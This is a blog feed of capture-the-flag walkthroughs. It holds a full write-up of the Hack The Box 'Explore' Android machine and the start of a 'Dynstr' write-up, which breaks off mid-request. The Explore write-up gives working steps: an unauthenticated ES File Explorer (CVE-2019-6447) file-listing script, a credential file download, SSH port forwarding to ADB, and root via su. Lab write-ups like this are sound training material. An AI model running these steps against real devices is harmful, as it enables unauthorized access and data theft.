<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://davicruz.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://davicruz.com/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2023-07-30T17:59:40-03:00</updated><id>https://davicruz.com/feed.xml</id><title type="html">Davi Cruz</title><subtitle>Just another Cybersecurity blog</subtitle><author><name>Davi Cruz</name></author><entry><title type="html">Walktrough: HTB Explore</title><link href="https://davicruz.com/walkthrough/2021/10/htb-explore" rel="alternate" type="text/html" title="Walktrough: HTB Explore" /><published>2021-10-30T13:00:00-03:00</published><updated>2021-10-30T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-explore</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-explore"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Explore</strong>, an easy-rated Android box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/27897">bertolis</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/0cwBArJ.png" alt="HTB Explore" class="align-center" /></p>

<p>This was my first Android machine in HTB and, besides not having ADB access directly, I was able to get SSH access from information obtained through a vulnerable app.</p>

<p>Hope you guys enjoy it!</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to see published ports on this box:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:26 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT     STATE    SERVICE VERSION
2222/tcp open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
5555/tcp filtered freeciv
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611A9FDB%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,24,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-SSH</span><span class="se">\x</span><span class="s2">20Server</span><span class="se">\x</span><span class="s2">20-</span><span class="se">\x</span><span class="s2">20Banana</span><span class="se">\x</span><span class="s2">20Studio</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.05 seconds
</code></pre></div></div>

<h3 id="5555tcp---freeciv">5555/TCP - freeciv</h3>

<p>As this is my first Android box, started researching about this <code class="language-plaintext highlighter-rouge">freeciv</code> service found. Interestingly I came across a <a href="https://medium.com/@samsepio1/android4-vulnhub-writeup-3036f352640f">write-up for a VulnHub machine</a> that mentions that this port is used by ADB (Android Debug Bridge) but, differently from that one, this port is currently <strong>filtered</strong>. Let’s keep this information for now until we find a way to open it and get an interactive shell on the device.</p>

<p>To look for any other missing information, ran another <code class="language-plaintext highlighter-rouge">nmap</code> scan, this time to check all TCP ports, and found the following additional ports open:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> allPorts 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Sarting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:44 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.070s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65530 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
37425/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.93 seconds
<span class="nv">$ </span>nmap <span class="nt">-p37425</span>,42135,59777 <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> Full 10.10.10.247
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:47 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.247
Host is up <span class="o">(</span>0.071s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
37425/tcp open  unknown
42135/tcp open  http    ES File Explorer Name Response httpd
59777/tcp open  http    Bukkit JSONAPI httpd <span class="k">for </span>Minecraft game server 3.6.0 or older
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port37425-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611AA4D5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
SF:enericLines,AA,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">20
SF:16</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2022</span><span class="se">\r\n</span><span class="s2">Conten
SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,5C,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20412</span><span class="se">\</span><span class="s2">
SF:x20Precondition</span><span class="se">\x</span><span class="s2">20Failed</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:4
SF:8:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,B5,<span class="s2">"HTTP/1</span><span class="se">\</span><span class="s2">
SF:.0</span><span class="se">\x</span><span class="s2">20501</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Implemented</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">
SF:2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/pla
SF:in;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Method</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">2
SF:0supported:</span><span class="se">\x</span><span class="s2">20OPTIONS"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,BB,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20R
SF:equest</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Cont
SF:ent-Length:</span><span class="se">\x</span><span class="s2">2039</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r</span><span class="s2">
SF:</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Not</span><span class="se">\x</span><span class="s2">20a</span><span class="se">\x</span><span class="s2">20valid</span><span class="se">\x</span><span class="s2">20protocol</span><span class="se">\x</span><span class="s2">20version:
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20RTSP/1</span><span class="se">\.</span><span class="s2">0"</span><span class="o">)</span>%r<span class="o">(</span>Help,AE,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Da
SF:te:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\</span><span class="s2">
SF:x2026</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection
SF::</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20HELP"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq
SF:,DD,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">
SF:202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2073</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20
SF:text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\</span><span class="s2">
SF:x20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\0</span><span class="s2">S</span><span class="se">\x</span><span class="s2">01</span><span class="se">\0\0</span><span class="s2">O</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\?</span><span class="s2">G</span><span class="se">\?\?\?</span><span class="s2">,</span><span class="se">\?\?\?</span><span class="sb">`</span>~<span class="se">\?</span>
SF:<span class="se">\0\?\?</span><span class="o">{</span><span class="se">\?\?\?\?</span>w<span class="se">\?\?\?\?</span>&lt;<span class="o">=</span><span class="se">\?</span>o<span class="se">\?\x</span>10n<span class="se">\0\0\(\0\x</span>16<span class="se">\0\x</span>13<span class="se">\0</span><span class="s2">")%r(TerminalSe
SF:rverCookie,CA,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Date:<span class="se">\x</span>20Mon,<span class="se">\x</span>201
SF:6<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>2054<span class="se">\r\n</span>Content
SF:-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connection:<span class="se">\x</span>20Close<span class="se">\r\n\r</span>
SF:<span class="se">\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>03<span class="se">\0\0\*</span>%<span class="se">\?\0\0\0\0\0</span>Cookie:<span class="se">\x</span>20msts
SF:hash<span class="o">=</span>nmap<span class="s2">")%r(TLSSessionReq,DB,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>D
SF:ate:<span class="se">\x</span>20Mon,<span class="se">\x</span>2016<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:
SF:<span class="se">\x</span>2071<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connectio
SF:n:<span class="se">\x</span>20Close<span class="se">\r\n\r\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>16<span class="se">\x</span>03<span class="se">\0\0</span>i<span class="se">\x</span>01<span class="se">\0\0</span>
SF:e<span class="se">\x</span>03<span class="se">\x</span>03U<span class="se">\x</span>1c<span class="se">\?\?</span>random1random2random3random4<span class="se">\0\0\x</span>0c<span class="se">\0</span>/<span class="se">\0</span><span class="s2">");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds
</span></code></pre></div></div>

<h3 id="42135tcp---es-file-explorer-name-response-httpd">42135/TCP - ES File Explorer Name Response httpd</h3>

<p>Searching for this service in <code class="language-plaintext highlighter-rouge">searchsploit</code> got one result for the Android platform.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit ES File Explorer
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                      | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                          | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure             | windows/remote/20488.txt
Microsoft Internet Explorer / MSN - ICC Profiles Crash <span class="o">(</span>PoC<span class="o">)</span>          | windows/dos/1110.txt
Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - | windows/remote/19603.txt
Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Ste | windows/remote/19094.txt
Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type  | windows/remote/19468.txt
Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Proto | windows/remote/24116.txt
Microsoft Internet Explorer 5/6 - <span class="s1">'file://'</span> Request Zone Bypass       | windows/remote/22575.txt
Microsoft Internet Explorer 6 - <span class="s1">'%USERPROFILE%'</span> File Execution        | windows/remote/22734.html
Microsoft Internet Explorer 6 - Local File Access                     | windows/remote/29619.html
Microsoft Internet Explorer 7 - Arbitrary File Rewrite <span class="o">(</span>MS07-027<span class="o">)</span>     | windows/remote/3892.html
My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities             | ios/webapps/28975.txt
WebFileExplorer 3.6 - <span class="s1">'user'</span> / <span class="s1">'pass'</span> SQL Injection                   | php/webapps/35851.txt
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>

<h2 id="initial-access-and-user-flag">Initial Access and User flag</h2>

<p>Checking this exploit, noticed that it relates to <strong>CVE-2019-6447</strong>, discussed in this post <strong><a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447) | by Knownsec 404 team | Medium</a></strong></p>

<p>This vulnerability consists in a flaw that allow the execution of commands implemented by this app in an unauthenticated way, without the need of any kind of authorization. As it is simple, I have created a Powershell script to enumerate available information:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/pwsh</span><span class="w">

</span><span class="nv">$methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'listFiles'</span><span class="p">,</span><span class="s1">'listPics'</span><span class="p">,</span><span class="s1">'listVideos'</span><span class="p">,</span><span class="s1">'listAudios'</span><span class="p">,</span><span class="s1">'listAppsAll'</span><span class="p">,</span><span class="s1">'getDeviceInfo'</span><span class="p">)</span><span class="w">

</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$method</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$methods</span><span class="p">){</span><span class="w">
    </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">"&gt;&gt;&gt; Method: </span><span class="nv">$method</span><span class="s2">"</span><span class="w"> </span><span class="nt">-foregroundcolor</span><span class="w"> </span><span class="nx">green</span><span class="w">
    </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-header</span><span class="w"> </span><span class="p">@{</span><span class="s2">"Content-Type"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">}</span><span class="w"> </span><span class="nt">-body</span><span class="w"> </span><span class="s2">"{'command':'</span><span class="nv">$method</span><span class="s2">'}"</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.10.247:59777</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>From the received output, the most interesting result was one picture called <code class="language-plaintext highlighter-rouge">creds.jpg</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; Method: listPics

name     : concept.jpg
time     : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size     : 135.33 KB (138,573 Bytes)

name     : anc.png
time     : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size     : 6.24 KB (6,392 Bytes)

name     : creds.jpg
time     : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size     : 1.14 MB (1,200,401 Bytes)

name     : 224_anc.png
time     : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size     : 124.88 KB (127,876 Bytes)
</code></pre></div></div>

<p>To download the file used the command below, also permited by the vulnerable app found:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg <span class="nt">-o</span> creds.jpg
</code></pre></div></div>

<p>Opening the image in a viewer, noticed that we had some credentials on it: <strong>kristi:Kr1sT!5h@Rp3xPl0r3!</strong></p>

<p><img src="https://i.imgur.com/senu2Y7.png" alt="HTB Explore - creds.jpg" class="align-center" /></p>

<p>These credentials allowed me to connect through SSH on port 2222, as previously enumerated. The first flag was found at <code class="language-plaintext highlighter-rouge">/sdcard/user.txt</code> file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222
Password authentication
Password:
:/ <span class="nv">$ </span><span class="nb">cd</span> /sdcard/
:/sdcard <span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>As now we have SSH rights to this box, we could get root access using ADB shell using SSH Local Port redirection, where I’ve redirected my attacker’s machine 5555/TCP to 5555/TCP in the target, via SSH as seen in the previously mentioned post.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kristi@10.10.10.247 <span class="nt">-p</span> 2222 <span class="nt">-L</span> 5555:127.0.0.1:5555
Password authentication
Password:
:/ <span class="err">$</span>
</code></pre></div></div>

<p>After this process, just needed to connect to <code class="language-plaintext highlighter-rouge">adb</code> in attacker machine from port redirection, tunneled through SSH connection and, to get <code class="language-plaintext highlighter-rouge">root</code> access, just needed to issue the command <code class="language-plaintext highlighter-rouge">su</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555
<span class="nv">$ </span>adb shell
x86_64:/ <span class="nv">$ </span>su
:/ <span class="c"># find / -type f 2&gt; /dev/null | grep root.txt</span>
/data/root.txt
:/ <span class="c"># cat /data/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed this box!</p>

<p>See you in the next post :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Android" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.]]></summary></entry><entry><title type="html">Walktrough: HTB Dynstr</title><link href="https://davicruz.com/walkthrough/2021/10/htb-dynstr" rel="alternate" type="text/html" title="Walktrough: HTB Dynstr" /><published>2021-10-16T13:00:00-03:00</published><updated>2021-10-16T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-dynstr</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-dynstr"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Dynstr</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/77141">jkr</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/kqW8fwk.png" alt="HTB Dynstr" class="align-center" /></p>

<p>Had the opportunity to learn a lot with this box. First while playing with some code injection dictionaries, and later understanding the <code class="language-plaintext highlighter-rouge">nsupdate</code> utility. After getting the code execution and reverse shell, found an RSA private key to be used with SSH, but had to overcome some restrictions on the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file to get another user account. Finally, to get <code class="language-plaintext highlighter-rouge">root</code>, played with globbing to get an escalation opportunity on the box.</p>

<p>I hope you guys enjoy it!</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started enumerating published services using a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.244
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-11 18:32 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.244
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e <span class="o">(</span>RSA<span class="o">)</span>
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Dyna DNS
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.02 seconds
</code></pre></div></div>

<p>Checking the initial scan output we can see a DNS Service, as well as an HTTP website published. Before looking into the DNS Service, let’s see which kind of information the website can give us.</p>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Accessing the webpage, as mentioned in the title, talks about a Dyna DNS company, a company like <a href="https://no-ip.com">No-IP</a> which allows you to register a DNS entry and dynamically update it, making it easier to access your resources when you don’t own a static IP address.</p>

<p><img src="https://i.imgur.com/gtdmYDI.jpg" alt="HTB Dynstr - Dyna DNS" class="align-center" /></p>

<p>Besides a single-page application, this website contains especially useful information in the section <em>Our Services</em>, that will be valuable to us during this box resolution, as well as the domain <code class="language-plaintext highlighter-rouge">dynadns.htb</code>, used in the e-mail address in the footer:</p>

<p><img src="https://i.imgur.com/QZvDDXJ.png" alt="HTB Dynstr - Dyna DNS Services" class="align-center" /></p>

<ul>
  <li>Application for DNS registration uses the same API as <code class="language-plaintext highlighter-rouge">no-ip.com</code>, as available in their documentation at <a href="https://www.noip.com/integrate/request">Integrate with No-IP DDNS - API Information (noip.com)</a>.</li>
  <li>The domains that could be used for this service are listed, which were later added to the local hosts file.</li>
  <li>Demo credentials were provided, so we can start playing with the API :smile:</li>
</ul>

<h4 id="interacting-with-the-api">Interacting with the API</h4>

<p>According to No-IP documentation, the API can be found at <code class="language-plaintext highlighter-rouge">/nic/update</code> and requires Basic authentication, where a GET request containing the IP and the hostname to be updated is the main feature of this API, as the example below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'dynadns:sndanyd'</span> | <span class="nb">base64
</span>ZHluYWRuczpzbmRhbnlk
<span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=myhostname.no-ip.htb"</span> <span class="nt">-v</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span>myhostname.no-ip.htb HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
